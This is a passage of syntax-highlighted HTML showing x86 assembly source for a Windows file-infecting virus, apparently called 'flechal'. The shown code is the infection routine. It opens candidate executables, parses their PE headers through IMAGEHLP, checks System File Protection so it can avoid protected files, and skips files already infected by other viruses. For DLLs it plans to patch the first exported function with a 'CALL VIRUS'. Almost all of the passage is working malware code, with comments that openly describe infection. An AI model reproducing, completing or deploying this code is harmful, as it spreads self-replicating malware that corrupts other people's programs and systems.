   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">

   </span><span class="sc5">_unloadtmapi</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_tmapi</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">FreeLibrary</span><span class="sc0">

   </span><span class="sc5">_out_tmapi</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_exit</span><span class="sc0">

   </span><span class="sc5">_openmutex</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_flechal1.0</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00100000h</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">OpenMutexA</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">_infect</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;  filename</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_sfc_flag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_loader_fixed_random_value</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_open_read</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">_file_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">_infect_end_1</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">_file_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2400</span><span class="sc0">
   </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">_infect_end_1</span><span class="sc0">

   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGEHLP.DLL</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">hWnd_imagehlp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_1</span><span class="sc0">

   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ImageNtHeader</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_imagehlp</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">ImageNtHeader</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ImageRvaToSection</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_imagehlp</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">ImageRvaToSection</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ImageRvaToVa</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_imagehlp</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">ImageRvaToVa</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGEHLP.DLL</span><span class="sc4">|</span><span class="sc5">LOADED</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ImageNtHeader</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_image_nt_headers</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc1">; GET GetProcAddress, GetModuleHandle/LoadLibrary import addresses</span><span class="sc0">
   </span><span class="sc1">; if not found, skip infection</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">locate_import</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PE_IMAGE_FOUND</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">_infect_entry_point</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_infect_entry_point</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_image_nt_headers</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ImageRvaToSection</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc2">.2</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_check_know_section</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc2">.2</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_infect_EP_section</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc1">;  sfc ?</span><span class="sc0">

   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SFC.DLL</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">hWnd_sfc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_no_sfc</span><span class="sc0">

   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SfcIsFileProtected</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_sfc</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">SfcIsFileProtected</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_unload_sfc</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SfcIsFileProtected</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_sfc_flag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">_unload_sfc</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_sfc</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">FreeLibrary</span><span class="sc0">

   </span><span class="sc5">_no_sfc</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">_sfc_flag</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SFC</span><span class="sc4">|</span><span class="sc5">OK</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc1">;  saving usefull fields...</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_biggest_rva</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_image_nt_headers</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ImageRvaToSection</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_infect_last_section</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_check_know_section</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc1">;  rva</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_last_section</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc1">;  CHANGES ON INFECTION TYPEs</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">_loader_memory_protect?</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc2">.8</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc2">.8</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_infect_flechal_rva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_infect_virtual_raw</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc5">_infect_flechal_rva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">   

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_flechal_rva</span><span class="sc0">

   </span><span class="sc1">;  if our RVA is very different from the original file size (plus than 4 Kb), we should avoid this infection</span><span class="sc0">
   </span><span class="sc1">;  maybe this file is infected by another virus</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_file_size</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc2">.16</span><span class="sc0">

   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc2">.16</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG2</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'kab.'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">MAX_PATH</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc1">;  export directory ?</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_image_nt_headers</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.IMAGE_NT_HEADERS.OptionalHeader.DataDirectory\
</span><span class="sc0">   </span><span class="sc5">.</span><span class="sc4">(</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc4">*</span><span class="sc5">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="sc4">)</span><span class="sc5">.isize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">_infect_export_sz</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.IMAGE_NT_HEADERS.OptionalHeader.DataDirectory\
</span><span class="sc0">   </span><span class="sc5">.</span><span class="sc4">(</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc4">*</span><span class="sc5">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="sc4">)\
</span><span class="sc0">   </span><span class="sc5">.VirtualAddress</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_infect_export_dir_rva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_no_export</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EXPORT_DIRECTORY_FOUND</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">_infect_entry_point</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_valid_entry_point</span><span class="sc0">

   </span><span class="sc1">;  export directory found</span><span class="sc0">
   </span><span class="sc1">;  sfc protection not found</span><span class="sc0">
   </span><span class="sc1">;  no entry-point (probably .DLL file)</span><span class="sc0">

   </span><span class="sc1">;  we've to try to infect the first exported</span><span class="sc0">
   </span><span class="sc1">;  function (replacing 5 first bytes by a "CALL VIRUS")</span><span class="sc0">

   </span><span class="sc1">;  infection flag - 0</span><span class="sc0">

   </span><span class="sc6">nop</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_infect_mode_1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
